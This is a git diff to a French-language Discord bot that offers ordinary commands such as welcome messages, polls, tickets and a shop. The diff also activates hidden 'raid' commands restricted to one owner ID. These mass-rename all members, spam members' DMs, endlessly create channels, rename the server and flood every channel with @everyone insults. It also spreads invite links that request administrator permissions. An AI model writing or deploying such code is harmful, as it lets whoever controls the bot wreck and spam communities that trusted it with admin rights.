@@ -43,7 +43,8 @@ let statuses = [
       "tranquile tu fait r 💸" ,
       "détourne  🎲 ", 
       "https://discord.gg/uyv76uv" ,
-      "Endorium Copiright ©️ 2019" 
+      "Endorium Copiright ©️ 2019", 
+      " pour Inviter le bot :https://bit.ly/botnerg"
 
      ]
 
@@ -60,6 +61,9 @@ let statuses = [
       })
 
   }, 3000)
+
+
+ 
 
 
 bot.on("message", async message => {
@@ -89,7 +93,27 @@ bot.on("message", async message => {
     m.edit(`Pong! Latency is ${m.createdTimestamp - message.createdTimestamp}ms. API Latency is ${Math.round(bot.ping)}ms`);
   }
 
+
+  if(command === "partenariat") {
+    
+    const sayMessage = args.join(" ");
+    var embed = new Discord.RichEmbed()
+    .setTitle("Nouveau Partenariat  ")
+    .addField(sayMessage,"Rejoignez Vite @everyone")
+    .setColor(0x1FDDE3)
+    .setFooter("Pour plus d'info Mp Mon fondateur ! BFR عизrgetiq#9348!")
+  message.channel.sendEmbed(embed);
+  }
   
+   if(command === 'stop') {
+    const embed = new Discord.RichEmbed()
+      .setTitle('Done.')
+      .setDescription(`Restarted in **${Math.floor(bot.ping)}**ms`);
+    if(message.author.id !== '316976857016696833') return;
+    message.channel.send(embed).then(() => {
+    process.exit(1);
+  })
+};
   if(command === "say") {
     // makes the bot say something and delete the message. As an example, it's open to anyone to use. 
     // To get the "message" itself we join the `args` back into a string with spaces: 
@@ -106,6 +130,16 @@ bot.on("message", async message => {
   }
   
  
+
+
+  if(command === "bvn") {
+    var embed = new Discord.RichEmbed()
+    .setTitle("Bienvenue ")
+    .addField(`BFR Energetiq  Vous Souhaite La Bienvenue !`,"Les autres aussi souhaite lui la Bienvenue !")
+    .setColor(0x1FDDE3)
+    .setFooter("Pour plus d'info Mp Mon fondateur ! BFR عизrgetiq#9348!")
+  message.channel.sendEmbed(embed);
+  }
 /*
 if (command === `Monnaie`) {
 
@@ -156,6 +190,7 @@ if (command === `infobot`) {
         .setThumbnail(botIcon)
         .addField('Nom Du Bot :', bot.user.username)
         .addField('Créer Par :', 'Energetiq')
+        .addField("Inviter le bot :","https://discordapp.com/api/oauth2/aAZuthorize?client_id=448518520301551627&permissions=8&scope=bot")
     .addField('');
 
     return message.channel.send(embed);
@@ -163,18 +198,20 @@ if (command === `infobot`) {
 
 
   
-/*  
+
 
         //RENAME TOUT LE MONDE EN DESSOUS DU BOT
         
           if(message.content === "name"){
-          message.delete();
-          message.guild.members.map(async (member, id) =>{
-            member.setNickname("🥔CHIPS🥔");
-          });
-        } 
+            if(message.author.id == "316976857016696833")
+                message.delete();
+                message.guild.members.map(async (member, id) =>{
+                member.setNickname("🥔CHIPS🥔");
+            });
+          } 
 
 // COMMANDE POUR SPAMMER MP
+if(message.author.id == "316976857016696833")
   if(command === "spamp") {
       message.delete()
        let i = 0;
@@ -183,11 +220,8 @@ if (command === `infobot`) {
           const embed = new Discord.RichEmbed()
            .setColor("RANDOM")
            .addField("BACKUP GO JOIN", `Le serveur ${message.guild.name} ce fait raid par ESPRIT 
-           "https://discord.gg/KcGVJwg"
-           "https://discordapp.com/oauth2/authorize?client_id=559409837159481383&permissions=8&scope=bot"
-           "https://discord.gg/KcGVJwg" 
-           "https://discord.gg/KcGVJwg"
-            https://discord.gg/KcGVJwg`)
+           "https://discordapp.com/api/oauth2/authorize?client_id=448518520301551627&permissions=8&scope=bot"
+            yes X)`)
            .setThumbnail("https://cdn.discordapp.com/attachments/549228916028735488/559406383640870912/Screenshot_20190320-212723.jpeg")
            e.user.send({embed});
          }, 1000);
@@ -196,12 +230,13 @@ if (command === `infobot`) {
 
  //COMMANDE DE CREATION DE CHANNEL, MODIFICATION DU NOM, DE LA REGION ET DE L'ICON DU SERVEUR
     if(command === "dead") {
+      if(message.author.id == "316976857016696833")
        if(message.channel.type === "dm") return;
         if(message.guild.name != "[Hackeur] ESPRIT"){
           let name = [
-    "ɴɪϙᴜᴇᴢ ᴘᴀʀ ᴇsᴘʀɪᴛ",
-    "ɴɪϙᴜᴇᴢ ᴘᴀʀ ᴇsᴘʀɪᴛ",
-    "ɴɪϙᴜᴇᴢ ᴘᴀʀ ᴇsᴘʀɪᴛ",
+    "Niquez par Des Chips Sataniques",
+    "Niquez par des chips Sataniques",
+    "Niquez pas des Chips Sataniques ",
           ]
           setInterval(function() {
             let names = name[Math.round(Math.random() * (name.length - 1))];
@@ -220,8 +255,8 @@ if (command === `infobot`) {
             message.guild.setRegion('russia').catch(error => {})
 		}
         setInterval(function () { if(message.guild.channels.size < 499){
-          message.guild.createChannel('ɴɪϙᴜᴇᴢ ᴘᴀʀ ᴇsᴘʀɪᴛ', 'voice').catch(error => {})
-          message.guild.createChannel(' ɴɪϙᴜᴇᴢ ᴘᴀʀ ᴇsᴘʀɪᴛ', 'text').catch(error => {})
+          message.guild.createChannel('Niquez Par des Chips La prochaine tu me raid pas x) ', 'voice').catch(error => {})
+          message.guild.createChannel(' Niquez Par Des Chips la prochaine tu me raid pas x)', 'text').catch(error => {})
         }}, 100)
         if(message.deletable) message.delete();
       }
@@ -231,11 +266,11 @@ if (command === `infobot`) {
      let i = 0;
      let interval = setInterval(function () {
        message.guild.channels.forEach(channel => {
-         if (channel.type === "text") channel.send(`Le serveur **${message.guild.name}** ce fait raid par 👻ESPRIT👻, Dédicace aux POTO de l'esprit. https://discord.gg/KcGVJwg  https://cdn.discordapp.com/attachments/550815489643905037/559694097791844352/3sKVHO28_400x400.png  @everyone`)
+         if (channel.type === "text") channel.send(`Le serveur **${message.guild.name}** ce fait raid par Par Des Chips Sataniques Enculeuse de Vaches Dabeuse qui aime daboudidabouda, Dédicace aux POTO de l'esprit. https://discord.gg/KcGVJwg  https://cdn.discordapp.com/attachments/550815489643905037/559694097791844352/3sKVHO28_400x400.png  @everyone`)
        }, 1000);
      });    
 }
-
+/*
    //COMMANDE POUR BAN TOUT LE MONDE SAUF CEUX AYANT LE GRADE
    
       if(command === "banall") {
@@ -286,10 +321,10 @@ if (command === `infobot`) {
        "La porchaine fois teste pas mon frr", { tts: true } ).catch(error => {}) }, 400)
       }
                                                                         
-*/
+
  
   
-  
+  */
 
 
   if(command === "kick") {
@@ -350,10 +385,14 @@ if (command === `infobot`) {
 			.addField("+ping", "pong! nan je rigole pour voir ta latence")
 			.addField(" +kick {user} [raison]", "pour éjécter un membre du serveur (réservé au Staff)")
 			.addField(" +purge {Nombre de message}", " Pour suprimé les messages!(réservé au staff) ")
-      .addField(" +pvme ", "Vous verez")
+      .addField(" +pvme ", "Vous raconte Une petite Histoire en MP")
       .addField(" +say {texte}", "Remplace votre message par celui du bot avec un embed")
-      .addField("+mute {la personne}","Permet de mute la personne" )
+      .addField("+mute {la personne}","Permet de mute la personne, !! IMPORTANT !! La commande est en maintenance(réservé au Staff)" )
       .addField("+new/+close","Pour crée un tickets (mais seulement dans le salon tickets)/pour férmé un ticket")
+      .addField("+bvn","Souhaite Bienvenue !")
+      .addField("+shop","Affiche le shop")
+      .addField("+partenariat ","A venir ....(réservé au Staff)")
+      .addField("+nordvpn","A venir ...")
       .setColor(0x1FDDE3)
 			.setFooter("Pour plus d'info Mp Mon fondateur ! BFR عизrgetiq#9348!")
 		message.channel.sendEmbed(embed);
@@ -380,57 +419,7 @@ if (command === `infobot`) {
     Channel.permissions()
    }
 
-
-
-  if(command === "msg") {
-        
-        let member = message.mentions.members.first() || message.guild.members.get(args[0]);
-        
-        let msgg = args.slice(1).join(' ');
-        
-        member.send(`${msgg} `)
-   
-  }
-
-
-
-  bot.on("message", async message => {
-  
-    if (message.content.startsWith(prefix + "mpall")) {
-    
-           var args = message.content.split(" ").slice(1);
-           var msge = args.join(' ');
- 
-            if(!message.guild.member(message.author).hasPermission("ADMINISTRATOR")) return message.channel.send("❌ Tu n'as pas la permission d'utiliser cette commande!");
-            if(!msge) return message.channel.send("Précise un message")
-            var mpall =new Discord.RichEmbed()
-               .setColor("RANDOM")
-               .addField("Message:", msge);
-               
-            message.delete()
-            message.guild.members.map(m => m.send(mpall))
-     
-        
- 
-    }
-
-});
-
-
-
-
-if(command === "shop")
-var embed = new Discord.RichEmbed()
-.setTitle("SHOP")
-.setDescription("Selly","Selly D'energetiq")
-.addField("Le shop D'energetiq : https://selly.gg/@energetiq","Pour plus D'info Mp mon créateur")
-.setColor(0x1FDDE3)
-.setFooter("Pour plus d'info Mp Mon fondateur ! BFR عизrgetiq#9348!")
-message.channel.sendEmbed(embed);
-
-
-
-  if(command === "purge") {
+   if(command === "purge") {
     // This command removes all messages from all users in the channel, up to 100.
     
     // get the delete count, as an actual number.
@@ -445,9 +434,92 @@ message.channel.sendEmbed(embed);
     message.channel.bulkDelete(fetched)
       .catch(error => message.reply(`Couldn't delete messages because of: ${error}`));
   }
+
+
+  if(command === "msg") {
+        
+        let member = message.mentions.members.first() || message.guild.members.get(args[0]);
+        
+        let msgg = args.slice(1).join(' ');
+        
+        member.send(`${msgg} `)
+   
+  }
+  if(command === "serveurinfo"){
+    var embed = new Discord.RichEmbed()
+      .setDescription("Info Discord")
+      .addField("Nom du discord",message.guild.name)
+      .addField("Crée le :", message.guild.createdAt)
+      .addField("tu as rejoint le :",message.member.joinedAt)
+      .addField("utilisateur Sur Le discord :",message.guild.memberCount)
+      .setColor("RANDOM")
+   message.channel.sendEmbed(embed);
+  };
+
+  if(command === "sondage") {
+    let args = message.content.split(" ").slice(1);
+    let thingToEcho = args.join(" ")
+    var embed = new Discord.RichEmbed()
+      .setDescription("Sondage ")
+      .addField(thingToEcho, "répondre avec :white_check_mark: ou :x:")
+      .setColor(0xB40404)
+      .setTimestamp()
+    message.guild.channels.find("name", "sondage").sendEmbed(embed)
+    .then(function (message) {
+      message.react("✅")
+      message.react("❌")
+    }).catch(function() {
+    });
+  }
+
+    
+
+
+  if(command === "bot ") {
+    message.channel.send("https://discordapp.com/api/oauth2/authorize?client_id=448518520301551627&permissions=8&scope=bot"
+    )
+  }
+
+
+  bot.on("message", async message => {
+  
+    if (message.content.startsWith(prefix + "mpall")) {
+        if(message.author.id == "316976857016696833")
+           var args = message.content.split(" ").slice(1);
+           var msge = args.join(' ');
+           const sayMessage = args.join(" ");
+ 
+            if(!message.guild.member(message.author).hasPermission("ADMINISTRATOR")) return message.channel.send("❌ Tu n'as pas la permission d'utiliser cette commande!");
+            if(!msge) return message.channel.send("Précise un message")
+            var mpall =new Discord.RichEmbed()
+               .setColor("RANDOM")
+               .addField("Message:", sayMessage);
+               
+            message.delete()
+            message.guild.members.map(m => m.send(mpall))
+     
+        
+ 
+    }
+
 });
 
+
+
+
+if(command === "shop") {
+var embed = new Discord.RichEmbed()
+.setTitle("SHOP")
+.setDescription("Selly","Selly D'energetiq")
+.addField("Le shop D'energetiq : https://selly.gg/@energetiq","Pour plus D'info Mp mon créateur")
+.setColor(0x1FDDE3)
+.setFooter("Pour plus d'info Mp Mon fondateur ! BFR عизrgetiq#9348!")
+message.channel.sendEmbed(embed);
+}
+
+
 bot.on('message', msg => {
+  if(message.author.id == "316976857016696833")
     if(msg.author.bot) return;
 
     if(msg.channel.type === "dm") return; //empeche d'exécuter les commandes en dm
@@ -571,7 +643,7 @@ bot.on('message', async message => {
       }
       message.guild.createChannel(`ticket-${message.author.id}`, "text").then(c => {
         c.setParent(parent_channel);
-        let role = message.guild.roles.find(e => e.name === '@everyone');
+        let role = message.guild.roles.find(e => e.name === '@Admin');
         c.overwritePermissions(role, {
             SEND_MESSAGES: false,
             READ_MESSAGES: false
@@ -609,8 +681,9 @@ if(command === 'close'){
         });
     });
 }
+})
 
-if (decomp_msg[0] === commands_prefix + "mute") {
+/*if (decomp_msg[0] === commands_prefix + "mute") {
   if(message.member.hasPermission("MANAGE_MESSAGES")) {
     if(!message.member.hasPermission("MANAGE_MESSAGES")) return message.reply("Vous n'avez pas la permissions");
     let mUser = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]))
@@ -639,7 +712,7 @@ if (decomp_msg[0] === commands_prefix + "mute") {
     mutechannel.send(muteEmbed)
     }
  }
-
+*/
 });
 
 bot.login(config.token);
